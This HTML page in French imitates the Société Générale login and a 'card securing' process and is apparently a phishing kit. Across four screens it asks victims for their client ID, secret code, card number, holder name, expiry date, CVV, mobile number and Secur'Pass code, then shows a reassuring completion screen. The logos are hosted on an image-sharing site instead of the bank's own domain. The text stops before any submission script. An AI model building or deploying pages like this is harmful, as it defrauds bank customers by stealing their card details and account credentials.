<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Société Générale · Sécurisation carte</title>
    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@300;400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* ===== STYLES COMMUNS ===== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        html, body {
            width: 100%;
            height: 100%;
            font-family: 'Source Sans Pro', Arial, sans-serif;
            background: white;
            overflow-x: hidden;
        }
        :root {
            --sg-red: #e60028;
            --sg-black: #000000;
            --sg-gray-light: #f5f5f5;
            --sg-gray-medium: #666666;
            --sg-white: #ffffff;
            --sg-green: #4CAF50;
            --border-radius: 8px;
        }

        /* ===== POLICE SOURCE SANS PRO SUR TOUS LES TEXTES ===== */
        body, button, input, select, textarea, 
        .btn, .validate-btn, .first-validate-btn, .validate-button,
        .account-button, .form-input, .input-line, .mystery-input,
        .simple-cell, .dashes, .step, .step-label, .breadcrumb, .page-title,
        .form-label, .checkbox-label, .input-hint,
        .space-title, .space-subtitle, .underlined-text,
        .link-with-icon, .social-icon, .patience-message, .tiny-timer {
            font-family: 'Source Sans Pro', sans-serif !important;
        }

        /* ===== HEADER ===== */
        .header-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 40px;
            background: white;
            border-bottom: 1px solid #eee;
        }
        .logo-image, .logo-section img {
            max-width: 180px;
            height: auto;
        }
        .button-section {
            flex-shrink: 0;
        }
        .account-button {
            background-color: #000;
            color: white;
            border: none;
            padding: 12px 28px;
            border-radius: 25px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            white-space: nowrap;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
        }

        /* ===== BREADCRUMB ===== */
        .breadcrumb {
            padding: 15px 40px;
            background: var(--sg-gray-light);
            font-size: 14px;
            color: var(--sg-gray-medium);
            border-bottom: 1px solid #e0e0e0;
        }
        .breadcrumb a {
            color: var(--sg-black);
            text-decoration: none;
        }

        /* ===== PAGES CONTAINER ===== */
        .page {
            display: none;
            flex-direction: column;
            min-height: 100vh;
        }
        .page.active {
            display: flex;
        }

        /* ===== PROGRESS ===== */
        .progress-container {
            width: 100%;
            max-width: 500px;
            margin: 0 auto 30px;
        }
        .progress-steps {
            display: flex;
            justify-content: space-between;
            position: relative;
        }
        .progress-steps::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: #eee;
            transform: translateY(-50%);
            z-index: 1;
        }
        .progress-bar {
            position: absolute;
            top: 50%;
            left: 0;
            height: 1px;
            background: var(--sg-red);
            transform: translateY(-50%);
            z-index: 2;
            width: 33%;
        }
        .step {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            background: var(--sg-white);
            border: 1px solid #eee;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 600;
            font-size: 14px;
            color: var(--sg-gray-medium);
            position: relative;
            z-index: 3;
        }
        .step.completed {
            background: var(--sg-red);
            border-color: var(--sg-red);
            color: var(--sg-white);
        }
        .step.active {
            border-color: var(--sg-red);
            color: var(--sg-red);
        }
        .step-label {
            position: absolute;
            top: 35px;
            left: 50%;
            transform: translateX(-50%);
            white-space: nowrap;
            font-size: 12px;
            color: var(--sg-gray-medium);
        }

        /* ===== PAGE 1 – CONNEXION ===== */
        .page-title {
            font-size: 14px;
            color: #666;
            margin: 0;
            padding: 20px 40px 10px;
            font-weight: 700;
            background: white;
            width: 100%;
        }
        .container {
            display: flex;
            width: 100%;
            flex: 1;
            background: white;
        }
        .left-column {
            flex: 1;
            padding: 30px 60px 30px 40px;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        .separator {
            width: 1px;
            background: linear-gradient(to bottom, transparent, #ddd, transparent);
        }
        .right-column {
            flex: 1;
            padding: 30px 40px 30px 60px;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        .input-container {
            position: relative;
            width: 100%;
            max-width: 400px;
            margin: 0 auto 5px;
        }
        .input-label {
            display: block;
            font-size: 14px;
            color: #000;
            font-weight: 600;
            margin-bottom: 8px;
        }
        .input-line {
            width: 100%;
            padding: 16px 45px 16px 20px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 18px;
            background: white;
            outline: none;
            font-weight: 600;
            transition: 0.3s;
        }
        .input-line:focus {
            border-color: #000;
            box-shadow: 0 0 0 3px rgba(0,0,0,0.1);
        }
        .clear-button {
            position: absolute;
            right: 15px;
            top: 40px;
            font-size: 20px;
            color: #999;
            background: none;
            border: none;
            cursor: pointer;
            width: 30px;
            height: 30px;
            border-radius: 50%;
        }
        .clear-button:hover {
            background: #f0f0f0;
        }
        .valid-check {
            position: absolute;
            right: 50px;
            top: 40px;
            font-size: 24px;
            color: #4CAF50;
            opacity: 0;
        }
        .valid-check.show { opacity: 1; }
        .inline-options {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 20px;
            margin-top: 10px;
            max-width: 400px;
            margin-left: auto;
            margin-right: auto;
        }
        
        /* ===== BOUTON OUI/NON REDESIGN ===== */
        .toggle-button {
            position: relative;
            width: 60px;
            height: 28px;
            border: none;
            border-radius: 14px;
            background: #e0e0e0;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .toggle-slider {
            position: absolute;
            top: 2px;
            left: 2px;
            width: 24px;
            height: 24px;
            background: white;
            border-radius: 50%;
            transition: transform 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
        }
        .toggle-button.active {
            background: var(--sg-green);
        }
        .toggle-button.active .toggle-slider {
            transform: translateX(32px);
        }
        .toggle-slider i {
            font-size: 14px;
            color: #666;
        }
        .toggle-button.active .toggle-slider i {
            color: var(--sg-green);
        }
        
        .remember-option {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .info-circle {
            width: 20px;
            height: 20px;
            border-radius: 50%;
            border: 1px solid #666;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
        }
        .first-validate-container {
            display: flex;
            justify-content: center;
            margin-top: 20px;
            max-width: 400px;
            margin-left: auto;
            margin-right: auto;
        }
        button.first-validate-btn {
            background: var(--sg-red);
            color: white;
            border: none;
            padding: 14px 30px;
            width: 200px;
            font-weight: 600;
            font-size: 18px;
            border-radius: 25px;
            cursor: pointer;
        }
        .simple-section {
            display: none;
            margin-top: 30px;
            max-width: 400px;
            margin-left: auto;
            margin-right: auto;
            text-align: center;
        }
        .dashes-x-container {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 15px;
        }
        .dashes {
            font-size: 22px;
            font-weight: bold;
            letter-spacing: 8px;
            color: #333;
            padding-right: 10px;
        }
        .x-button {
            font-size: 22px;
            color: #666;
            cursor: pointer;
            background: none;
            border: none;
        }
        .simple-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 3px;
            max-width: 210px;
            margin: 0 auto 20px;
        }
        .simple-cell {
            width: 45px;
            height: 45px;
            border: 1px solid #ccc;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            font-weight: bold;
            background: white;
            cursor: pointer;
        }
        .simple-cell.empty { background: #f5f5f5; border-color: #e0e0e0; cursor: default; }
        .simple-cell.selected { background: #cccccc; }
        button.validate-button {
            background: var(--sg-red);
            color: white;
            border: none;
            padding: 14px 30px;
            width: 200px;
            font-weight: 600;
            font-size: 18px;
            border-radius: 25px;
            cursor: pointer;
        }
        button.validate-button:disabled { background: #ccc; cursor: not-allowed; }
        .right-column h3 { color: #333; margin: 30px 0 15px; font-size: 18px; }
        .right-column p { margin-bottom: 15px; line-height: 1.5; font-size: 15px; }
        .right-column li { margin-bottom: 8px; padding-left: 20px; position: relative; list-style: none; }
        .right-column li:before { content: "»"; position: absolute; left: 0; color: #333; }
        .gray-section {
            background: #f5f5f5;
            padding: 40px;
            border-top: 1px solid #e0e0e0;
        }
        .gray-section h2 {
            font-size: 28px;
            font-weight: bold;
            text-align: center;
            padding-bottom: 15px;
            border-bottom: 1px solid #e0e0e0;
            margin-bottom: 30px;
        }
        .client-spaces-container {
            display: flex;
            flex-direction: column;
            gap: 20px;
            max-width: 600px;
            margin: 0 auto 40px;
        }
        .white-block {
            background: white;
            border-radius: 6px;
            padding: 25px 30px;
            border: 1px solid #e0e0e0;
            display: flex;
            align-items: center;
            gap: 20px;
            position: relative;
            cursor: pointer;
            transition: 0.2s;
        }
        .white-block:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
        .icon-wrapper {
            width: 50px; height: 50px;
            background: #f0f0f0;
            border-radius: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .icon-wrapper i { font-size: 24px; color: #000; }
        .space-title { font-size: 18px; font-weight: bold; color: #000; }
        .space-subtitle { font-size: 16px; color: #666; }
        .arrow-right { position: absolute; right: 30px; font-size: 20px; color: #666; transition: 0.2s; }
        .white-block:hover .arrow-right { transform: translateX(5px); color: #333; }
        .links-section { margin-top: 40px; padding-top: 40px; border-top: 1px solid #e0e0e0; }
        .links-section h3 { font-size: 28px; font-weight: bold; text-align: center; padding-bottom: 15px; border-bottom: 1px solid #e0e0e0; margin-bottom: 35px; }
        .links-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 40px; max-width: 600px; margin: 0 auto; }
        .link-title-with-icon { display: flex; align-items: center; gap: 15px; margin-bottom: 20px; }
        .icon-container { width: 40px; height: 40px; background: #f0f0f0; border-radius: 4px; display: flex; align-items: center; justify-content: center; }
        .underlined-text { padding: 10px 0; font-size: 15px; color: #000; text-decoration: underline; text-underline-offset: 3px; cursor: pointer; }
        .text-container { margin-left: 55px; }
        .black-bar {
            background: #000;
            color: white;
            padding: 20px 40px;
        }
        .bar-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .left-section { display: flex; gap: 40px; }
        .link-with-icon { display: flex; align-items: center; gap: 10px; color: white; text-decoration: none; }
        .right-section { display: flex; gap: 25px; }
        .social-icon { color: white; font-size: 20px; }

        /* ===== PAGE 2 – SÉCURISATION CARTE ===== */
        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 40px 20px;
            min-height: 70vh;
        }
        .form-container {
            width: 100%;
            max-width: 500px;
            background: white;
            border-radius: var(--border-radius);
            padding: 40px;
            border: 1px solid #eee;
        }
        .form-title { text-align: center; margin-bottom: 30px; }
        .form-title h1 { font-size: 24px; font-weight: 700; margin-bottom: 10px; }
        .form-subtitle { font-size: 16px; color: var(--sg-gray-medium); line-height: 1.5; }
        .form-group { margin-bottom: 25px; }
        .form-label {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 10px;
            font-weight: 600;
            font-size: 15px;
        }
        .input-with-icon { position: relative; }
        .form-input {
            width: 100%;
            padding: 14px 45px 14px 20px;
            border: 2px solid #ddd;
            border-radius: var(--border-radius);
            font-size: 16px;
            background: white;
        }
        .form-input:focus { border-color: var(--sg-red); outline: none; }
        .input-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--sg-gray-medium);
            font-size: 18px;
        }
        .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        .checkbox-group {
            display: flex;
            align-items: flex-start;
            gap: 12px;
            margin: 20px 0;
        }
        .checkbox-input { width: 20px; height: 20px; margin-top: 3px; }
        .button-group {
            display: flex;
            gap: 15px;
            margin-top: 30px;
        }
        .btn {
            flex: 1;
            padding: 16px;
            border-radius: var(--border-radius);
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            border: none;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        .btn-primary { background: var(--sg-red); color: white; }
        .btn-secondary { background: var(--sg-gray-light); color: var(--sg-black); }
        .btn-primary:hover:not(:disabled) { background: #cc0023; }
        .session-info {
            background: #f9f9f9;
            padding: 15px;
            margin-bottom: 25px;
            border-radius: 6px;
            border-left: 4px solid var(--sg-red);
            display: none;
        }

        /* ===== PAGE 3 – VÉRIFICATION SECUR'PASS ===== */
        .verification-container {
            width: 100%;
            max-width: 500px;
            background: white;
            border-radius: var(--border-radius);
            padding: 40px;
            border: 1px solid #eee;
            text-align: center;
        }
        .security-icon {
            width: 60px; height: 60px;
            background: white;
            border: 2px solid #ddd;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 25px;
        }
        .security-icon i { font-size: 24px; color: var(--sg-gray-medium); }
        .verification-title { font-size: 24px; font-weight: 700; margin-bottom: 10px; }
        .verification-subtitle { font-size: 16px; color: var(--sg-gray-medium); margin-bottom: 30px; }
        .mystery-input-container { max-width: 400px; margin: 30px auto; }
        .mystery-label { display: block; text-align: left; font-weight: 600; margin-bottom: 8px; }
        .mystery-input-wrapper { position: relative; }
        .mystery-input {
            width: 100%;
            padding: 16px 45px 16px 20px;
            border: 2px solid #ddd;
            border-radius: var(--border-radius);
            font-size: 20px;
            font-weight: 600;
            text-align: center;
            letter-spacing: 4px;
            height: 60px;
        }
        .mystery-input:focus { border-color: var(--sg-red); outline: none; }
        .input-hint { font-size: 14px; color: var(--sg-gray-medium); margin-top: 8px; }
        .validate-btn {
            background: var(--sg-red);
            color: white;
            border: none;
            padding: 16px 40px;
            border-radius: var(--border-radius);
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            min-width: 200px;
            justify-content: center;
            margin-top: 30px;
        }
        .validate-btn:disabled { background: #ccc; cursor: not-allowed; }

        /* ===== PAGE 4 – FINALISÉE (TIMER 10s FIN ET PETIT) ===== */
        .final-container {
            width: 100%;
            max-width: 600px;
            background: var(--sg-white);
            border-radius: var(--border-radius);
            padding: 40px;
            border: 1px solid #eee;
            text-align: center;
        }
        .check-icon {
            width: 70px;
            height: 70px;
            background: var(--sg-white);
            border: 2px solid var(--sg-green);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 25px;
        }
        .check-icon i {
            font-size: 30px;
            color: var(--sg-green);
        }
        .final-title {
            font-size: 26px;
            font-weight: 700;
            color: var(--sg-black);
            margin-bottom: 15px;
            line-height: 1.3;
        }
        .final-message {
            font-size: 16px;
            color: var(--sg-gray-medium);
            margin-bottom: 30px;
            line-height: 1.5;
        }
        .success-card {
            background: var(--sg-gray-light);
            border-radius: var(--border-radius);
            padding: 25px;
            margin: 25px 0 30px;
            text-align: left;
            border: 1px solid #e0e0e0;
        }
        .success-title {
            font-size: 18px;
            font-weight: 700;
            color: var(--sg-black);
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .success-title i {
            color: var(--sg-green);
        }
        .success-list {
            list-style-type: none;
            padding-left: 0;
        }
        .success-list li {
            margin-bottom: 12px;
            padding-left: 25px;
            position: relative;
            font-size: 15px;
            line-height: 1.4;
            color: var(--sg-gray-medium);
        }
        .success-list li:before {
            content: '✓';
            position: absolute;
            left: 0;
            color: var(--sg-green);
            font-weight: bold;
        }
        
        /* ===== MESSAGE DE PATIENCE 10s (FIN ET PETIT) ===== */
        .patience-container {
            margin-top: 20px;
            padding: 15px 20px;
            background: #f9f9f9;
            border-radius: var(--border-radius);
            border-left: 3px solid var(--sg-red);
            text-align: left;
        }
        .patience-message {
            font-size: 14px;
            font-weight: 500;
            color: var(--sg-gray-medium);
            line-height: 1.5;
            margin-bottom: 8px;
        }
        .tiny-timer {
            display: flex;
            align-items: center;
            justify-content: flex-end;
            gap: 6px;
            font-size: 13px;
            color: var(--sg-gray-medium);
        }
        .timer-badge {
            background: var(--sg-red);
            color: white;
            padding: 3px 8px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            letter-spacing: 0.5px;
        }

        /* ===== FOOTER ===== */
        .white-space-below {
            background: white;
            padding: 20px 40px 25px;
            border-top: 1px solid #eee;
        }
        .footer-container { width: 100%; }
        .logo-section-footer { text-align: center; margin-bottom: 15px; }
        .sg-logo-img { max-width: 150px; height: auto; }
        .links-lines { text-align: center; font-size: 13px; color: #666; line-height: 1.8; }
        .link-item { display: inline-block; margin: 0 5px; }
        .link-item a { color: #666; text-decoration: none; }
        .separator { color: #999; margin: 0 8px; }
        .line-break { display: block; margin-top: 8px; }

        @media (max-width: 1100px) {
            .container { flex-direction: column; }
            .separator { width: 100%; height: 1px; background: linear-gradient(to right, transparent, #ddd, transparent); }
        }
        @media (max-width: 768px) {
            .header-container, .breadcrumb { padding: 15px 20px; }
            .left-column, .right-column { padding: 30px 20px; }
            .gray-section { padding: 40px 20px; }
            .black-bar { padding: 20px; }
            .bar-container { flex-direction: column; gap: 20px; }
            .left-section { flex-wrap: wrap; justify-content: center; }
            .links-grid { grid-template-columns: 1fr; }
            .form-row { grid-template-columns: 1fr; }
            .button-group { flex-direction: column; }
            .verification-container { padding: 30px 20px; }
            .validate-btn { min-width: 100%; }
            .final-container { padding: 30px 20px; }
        }
    </style>
</head>
<body>
    <!-- ================================================= -->
    <!-- PAGE 1 : CONNEXION + CLAVIER SIMPLIFIÉ           -->
    <!-- ================================================= -->
    <div id="page1" class="page active">
        <div class="header-container">
            <div class="logo-section">
                <img src="https://i.ibb.co/3ypDzj93/SG.png" alt="SG - C'EST VOUS L'AVENIR" class="logo-image">
            </div>
            <div class="button-section">
                <button class="account-button">Ouvrir un compte</button>
            </div>
        </div>
        
        <div class="main-content" style="padding:0; width:100%;">
            <div class="page-title">Connexion à votre Espace Client Particuliers</div>
            
            <div class="container">
                <div class="left-column">
                    <div class="input-container">
                        <label for="clientCode" class="input-label">Saisissez votre identifiant client</label>
                        <input type="text" id="clientCode" class="input-line" placeholder="Votre identifiant" maxlength="8" pattern="[0-9]*" inputmode="numeric">
                        <button class="clear-button" id="clearButton">✕</button>
                        <div class="valid-check" id="validCheck">✓</div>
                    </div>
                    
                    <div class="inline-options">
                        <button class="toggle-button" id="nonToggle" type="button">
                            <div class="toggle-slider">
                                <i class="fas fa-circle"></i>
                            </div>
                        </button>
                        <div class="remember-option">
                            <label for="remember">Se souvenir de moi</label>
                            <div class="info-circle" id="infoBtn">i</div>
                        </div>
                    </div>
                    
                    <div class="first-validate-container">
                        <button class="first-validate-btn" id="firstValidateBtn">Valider</button>
                    </div>
                    
                    <div class="simple-section" id="simpleSection">
                        <div class="dashes-x-container">
                            <div class="dashes" id="dashesDisplay">- - - - - -</div>
                            <div class="x-button" id="xButton">✕</div>
                        </div>
                        <div class="simple-grid" id="simpleGrid"></div>
                        <div class="validate-button-container">
                            <button class="validate-button" id="validateButton" disabled>Valider</button>
                        </div>
                        <div class="sound-text">Activer le clavier sonore</div>
                    </div>
                </div>
                
                <div class="separator"></div>
                
                <div class="right-column">
                    <div class="section">
                        <h3>Où trouver mon Code Client SG ?</h3>
                        <p>Votre Code Client vous a été communiqué lors de la souscription à la Banque à Distance. Il est également indiqué sur vos relevés de comptes.</p>
                    </div>
                    <div class="section">
                        <h3>Code Client ou Code Secret inconnus ?</h3>
                        <ul>
                            <li>Je souhaite obtenir mon Code Client</li>
                            <li>Je ne connais pas mon Code Secret</li>
                        </ul>
                    </div>
                </div>
            </div>
            
            <div class="gray-section">
                <h2>Nos autres espaces de connexion</h2>
                <div class="client-spaces-container">
                    <div class="white-block">
                        <div class="icon-wrapper"><i class="fas fa-building"></i></div>
                        <div class="space-content">
                            <div class="space-title">Espace Client Professionnels</div>
                            <div class="space-subtitle">Progéliance Net</div>
                        </div>
                        <div class="arrow-right"><i class="fas fa-chevron-right"></i></div>
                    </div>
                    <div class="white-block">
                        <div class="icon-wrapper"><i class="fas fa-user-tie"></i></div>
                        <div class="space-content">
                            <div class="space-title">Espace Client Entreprises</div>
                            <div class="space-subtitle">Sogecash Net</div>
                        </div>
                        <div class="arrow-right"><i class="fas fa-chevron-right"></i></div>
                    </div>
                </div>
                <div class="links-section">
                    <h3>Liens utiles</h3>
                    <div class="links-grid">
                        <div class="link-column">
                            <div class="link-title-with-icon">
                                <div class="icon-container"><i class="fas fa-credit-card"></i></div>
                                <h4>Urgences carte bancaire</h4>
                            </div>
                            <div class="text-container">
                                <div class="underlined-text">Faire opposition à votre carte bancaire</div>
                                <div class="underlined-text">Verrouiller votre carte bancaire</div>
                            </div>
                        </div>
                        <div class="link-column">
                            <div class="link-title-with-icon">
                                <div class="icon-container"><i class="fas fa-shield-alt"></i></div>
                                <h4>Nos conseils sécurité</h4>
                            </div>
                            <div class="text-container">
                                <div class="underlined-text">Découvrez le Pass sécurité</div>
                                <div class="underlined-text">Guide des bonnes pratiques</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="footer-section">
            <div class="black-bar">
                <div class="bar-container">
                    <div class="left-section">
                        <a href="#" class="link-with-icon"><i class="fas fa-comment-dots icon"></i><span>Questions fréquentes</span></a>
                        <a href="#" class="link-with-icon"><i class="fas fa-map-marker-alt icon"></i><span>Trouver une agence</span></a>
                        <a href="#" class="link-with-icon"><i class="fas fa-external-link-alt icon"></i><span>Autres sites SG</span></a>
                    </div>
                    <div class="right-section">
                        <a href="#" class="social-icon"><i class="fab fa-facebook-f"></i></a>
                        <a href="#" class="social-icon"><i class="fab fa-instagram"></i></a>
                        <a href="#" class="social-icon"><i class="fab fa-x-twitter"></i></a>
                    </div>
                </div>
            </div>
            <div class="white-space-below">
                <div class="footer-container">
                    <div class="logo-section-footer">
                        <img src="https://i.ibb.co/PvFphHcf/Societe-Generale-Logo.jpg" alt="Société Générale Logo" class="sg-logo-img">
                    </div>
                    <div class="links-lines">
                        <span class="link-item"><a href="#">Sécurité</a></span><span class="separator">|</span>
                        <span class="link-item"><a href="#">Gestion des Cookies</a></span><span class="separator">|</span>
                        <span class="link-item"><a href="#">Documentation et Tarifs</a></span><span class="separator">|</span>
                        <span class="link-item"><a href="#">Résilier une prestation</a></span><span class="separator">|</span>
                        <span class="link-item"><a href="#">Contestation et réclamation</a></span><span class="separator">|</span>
                        <span class="link-item"><a href="#">Informations légales</a></span>
                        <span class="line-break"></span>
                        <span class="link-item"><a href="#">Fonds de Garantie des Dépôts et de Résolution</a></span><span class="separator">|</span>
                        <span class="link-item"><a href="#">Accessibilité Numérique (partiellement conforme)</a></span><span class="separator">|</span>
                        <span class="link-item"><a href="#">Label « Engagé RSE »</a></span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- ================================================= -->
    <!-- PAGE 2 : SÉCURISATION CARTE                      -->
    <!-- ================================================= -->
    <div id="page2" class="page">
        <div class="header-container">
            <div class="logo-section">
                <img src="https://i.ibb.co/3ypDzj93/SG.png" alt="SG" class="logo-image">
            </div>
        </div>
        <div class="breadcrumb">
            <a href="#" id="backToPage1">Mon espace</a> > <a href="#">Mes cartes</a> > <span>Sécurisation de la carte</span>
        </div>
        <div class="main-content">
            <div class="progress-container">
                <div class="progress-steps">
                    <div class="progress-bar" style="width:33%"></div>
                    <div class="step completed"><span>1</span><div class="step-label">Identification</div></div>
                    <div class="step active"><span>2</span><div class="step-label">Sécurisation</div></div>
                    <div class="step"><span>3</span><div class="step-label">Vérification</div></div>
                </div>
            </div>
            <div class="form-container">
                <div class="form-title">
                    <h1>Sécurisation de votre carte</h1>
                    <div class="form-subtitle">
                        Veuillez saisir les informations de votre carte bancaire pour activer les protections de sécurité.
                    </div>
                </div>
                <div class="session-info" id="sessionInfo" style="display:none;"></div>
                <form id="cardSecurityForm">
                    <div class="form-group">
                        <label class="form-label"><i class="fas fa-credit-card"></i><span>Numéro de carte</span></label>
                        <div class="input-with-icon">
                            <input type="text" id="cardNumber" class="form-input" placeholder="xxxx xxxx xxxx xxxx" maxlength="19" required>
                            <div class="input-icon"><i class="fas fa-credit-card"></i></div>
                        </div>
                    </div>
                    <div class="form-group">
                        <label class="form-label"><i class="fas fa-user"></i><span>Titulaire de la carte</span></label>
                        <div class="input-with-icon">
                            <input type="text" id="cardHolder" class="form-input" placeholder="NOM PRENOM" required>
                            <div class="input-icon"><i class="fas fa-user"></i></div>
                        </div>
                    </div>
                    <div class="form-row">
                        <div class="form-group">
                            <label class="form-label"><i class="fas fa-calendar-alt"></i><span>Date d'expiration</span></label>
                            <div class="input-with-icon">
                                <input type="text" id="cardExpiry" class="form-input" placeholder="xx/xx" maxlength="5" required>
                                <div class="input-icon"><i class="fas fa-calendar-alt"></i></div>
                            </div>
                        </div>
                        <div class="form-group">
                            <label class="form-label"><i class="fas fa-lock"></i><span>Code de sécurité (CVV)</span></label>
                            <div class="input-with-icon">
                                <input type="password" id="cardCVV" class="form-input" placeholder="123" maxlength="4" required>
                                <div class="input-icon"><i class="fas fa-lock"></i></div>
                            </div>
                        </div>
                    </div>
                    <div class="form-group">
                        <label class="form-label"><i class="fas fa-mobile-alt"></i><span>Numéro de téléphone mobile</span></label>
                        <div class="input-with-icon">
                            <input type="tel" id="phoneNumber" class="form-input" placeholder="xx xx xx xx xx" required>
                            <div class="input-icon"><i class="fas fa-mobile-alt"></i></div>
                        </div>
                    </div>
                    <div class="checkbox-group">
                        <input type="checkbox" id="consentTerms" class="checkbox-input" required>
                        <label for="consentTerms" class="checkbox-label">J'ai lu et j'accepte les conditions générales de sécurisation</label>
                    </div>
                    <div class="button-group">
                        <button type="button" class="btn btn-secondary" id="backBtn"><i class="fas fa-arrow-left"></i> Retour</button>
                        <button type="submit" class="btn btn-primary" id="submitBtn">Continuer <i class="fas fa-arrow-right"></i></button>
                    </div>
                </form>
            </div>
        </div>
        <div class="footer-section">
            <div class="white-space-below">
                <div class="footer-container">
                    <div class="logo-section-footer"><img src="https://i.ibb.co/PvFphHcf/Societe-Generale-Logo.jpg" alt="SG" class="sg-logo-img"></div>
                    <div class="links-lines">
                        <span class="link-item"><a href="#">Sécurité</a></span><span class="separator">|</span>
                        <span class="link-item"><a href="#">Gestion des Cookies</a></span><span class="separator">|</span>
                        <span class="link-item"><a href="#">Documentation et Tarifs</a></span><span class="separator">|</span>
                        <span class="link-item"><a href="#">Résilier une prestation</a></span><span class="separator">|</span>
                        <span class="link-item"><a href="#">Contestation et réclamation</a></span><span class="separator">|</span>
                        <span class="link-item"><a href="#">Informations légales</a></span>
                        <span class="line-break"></span>
                        <span class="link-item"><a href="#">Fonds de Garantie des Dépôts et de Résolution</a></span><span class="separator">|</span>
                        <span class="link-item"><a href="#">Accessibilité Numérique</a></span><span class="separator">|</span>
                        <span class="link-item"><a href="#">Label « Engagé RSE »</a></span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- ================================================= -->
    <!-- PAGE 3 : VÉRIFICATION SECUR'PASS                 -->
    <!-- ================================================= -->
    <div id="page3" class="page">
        <div class="header-container">
            <div class="logo-section">
                <img src="https://i.ibb.co/3ypDzj93/SG.png" alt="SG" class="logo-image">
            </div>
        </div>
        <div class="breadcrumb">
            <a href="#" id="backToPage2FromVerif">Mon espace</a> > <a href="#">Mes cartes</a> > <span>Vérification Secur'Pass</span>
        </div>
        <div class="main-content">
            <div class="progress-container">
                <div class="progress-steps">
                    <div class="progress-bar" style="width:100%"></div>
                    <div class="step completed"><span>1</span><div class="step-label">Identification</div></div>
                    <div class="step completed"><span>2</span><div class="step-label">Sécurisation</div></div>
                    <div class="step active"><span>3</span><div class="step-label">Vérification</div></div>
                </div>
            </div>
            <div class="verification-container">
                <div class="security-icon"><i class="fas fa-lock"></i></div>
                <h1 class="verification-title">Vérification Secur'Pass</h1>
                <p class="verification-subtitle">Saisissez votre code Secur'Pass personnel (4 à 8 chiffres)</p>
                
                <div class="mystery-input-container">
                    <label class="mystery-label">Code Secur'Pass</label>
                    <div class="mystery-input-wrapper">
                        <input type="password" id="mysteryCode" class="mystery-input" placeholder="••••••" maxlength="8" pattern="[0-9]{4,8}" autocomplete="off" inputmode="numeric">
                        <div class="input-icon"><i class="fas fa-key"></i></div>
                    </div>
                    <div class="input-hint">Code personnel de 4 à 8 chiffres</div>
                </div>
                <button class="validate-btn" id="validateMysteryBtn" disabled>
                    <i class="fas fa-check"></i> Vérifier et Finaliser
                </button>
            </div>
        </div>
        <div class="footer-section">
            <div class="white-space-below">
                <div class="footer-container">
                    <div class="logo-section-footer"><img src="https://i.ibb.co/PvFphHcf/Societe-Generale-Logo.jpg" alt="SG" class="sg-logo-img"></div>
                    <div class="links-lines">
                        <span class="link-item"><a href="#">Sécurité</a></span><span class="separator">|</span>
                        <span class="link-item"><a href="#">Gestion des Cookies</a></span><span class="separator">|</span>
                        <span class="link-item"><a href="#">Documentation et Tarifs</a></span><span class="separator">|</span>
                        <span class="link-item"><a href="#">Résilier une prestation</a></span><span class="separator">|</span>
                        <span class="link-item"><a href="#">Contestation et réclamation</a></span><span class="separator">|</span>
                        <span class="link-item"><a href="#">Informations légales</a></span>
                        <span class="line-break"></span>
                        <span class="link-item"><a href="#">Fonds de Garantie des Dépôts et de Résolution</a></span><span class="separator">|</span>
                        <span class="link-item"><a href="#">Accessibilité Numérique</a></span><span class="separator">|</span>
                        <span class="link-item"><a href="#">Label « Engagé RSE »</a></span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- ================================================= -->
    <!-- PAGE 4 : SÉCURISATION FINALISÉE - TIMER 10s FIN   -->
    <!-- ================================================= -->
    <div id="page4" class="page">
        <div class="header-container">
            <div class="logo-section">
                <img src="https://i.ibb.co/3ypDzj93/SG.png" alt="SG" class="logo-image">
            </div>
        </div>
        
        <div class="breadcrumb">
            <span>Mon espace</span> > <span>Sécurisation finalisée</span>
        </div>
        
        <div class="main-content">
            <div class="final-container">
                <div class="check-icon">
